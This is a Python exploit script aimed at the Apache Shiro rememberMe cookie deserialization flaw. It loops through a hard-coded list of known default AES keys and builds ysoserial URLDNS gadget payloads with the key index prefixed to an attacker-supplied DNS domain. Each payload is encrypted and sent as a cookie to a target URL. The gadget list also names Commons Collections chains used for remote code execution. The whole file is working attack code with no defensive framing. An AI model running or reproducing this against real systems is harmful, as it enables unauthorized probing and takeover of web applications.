#!/usr/bin/env python3
# coding=utf-8
import sys
import uuid
import base64
import subprocess
import requests
import random
from Crypto.Cipher import AES
import ssl


EXP_CLASS = ["JRMPClient","URLDNS","CommonsBeanutils1","CommonsCollections1","CommonsCollections2"]
BLOCK_SIZE = AES.block_size
PAD_FUNC = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode()
AES_MODE = AES.MODE_CBC
AES_IV = uuid.uuid4().bytes

def shiro_scan(url,cmd):
    CipherKey = ["kPH+bIxk5D2deZiIxcaaaA==","2AvVhdsgUs0FSA3SDFAdag==","3AvVhmFLUs0KTA3Kprsdag==","4AvVhmFLUs0KTA3Kprsdag==","5AvVhmFLUs0KTA3Kprsdag==",
        "5aaC5qKm5oqA5pyvAAAAAA==","6ZmI6I2j5Y+R5aSn5ZOlAA==","bWljcm9zAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==",
        "Z3VucwAAAAAAAAAAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","U3ByaW5nQmxhZGUAAAAAAA==",
        "fCq+/xW488hMTCD+cmJ3aQ==","1QWLxg+NYmxraMoxAXu/Iw==","ZUdsaGJuSmxibVI2ZHc9PQ==","L7RioUULEFhRyxM7a2R/Yg==",
        "r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw=="]

    for i in range(0,len(CipherKey)):
        key = CipherKey[i]
        cmd1 = "http://"+ str(i)+"."+ cmd 
        print (cmd1)
        print (key)
        log = attack(url,key,cmd1)
        if (log == "true"):
            print ("[***] Request to target URL success! CipherKey: {}".format(key))
            print ("=============================================\n")
        else:
            print("[xxx] Request to target URL fail! CipherKey: {}".format(key))
            print ("=============================================\n")

def attack(url,key,cmd):

    popen = subprocess.Popen(["java", "-jar", "ysoserial.jar", "URLDNS",cmd],stdout=subprocess.PIPE)
    encryptor = AES.new(base64.b64decode(key), AES_MODE, AES_IV)
    file_body = PAD_FUNC(popen.stdout.read())
    base64_ciphertext = base64.b64encode(AES_IV + encryptor.encrypt(file_body))
    #print("[*] base64_ciphertext: {}".format(base64_ciphertext))
    #print("[*] base64_decodeTXT: rememberMe={}".format(base64_ciphertext.decode()))
    try:
        response = requests.get(url, timeout=50, cookies={"rememberMe": base64_ciphertext.decode()}, verify=False)
        return "true"
    except Exception as e:
        return "false"

if __name__ == '__main__':
    url = sys.argv[1]
    cmd = sys.argv[2]
    shiro_scan(url,cmd)
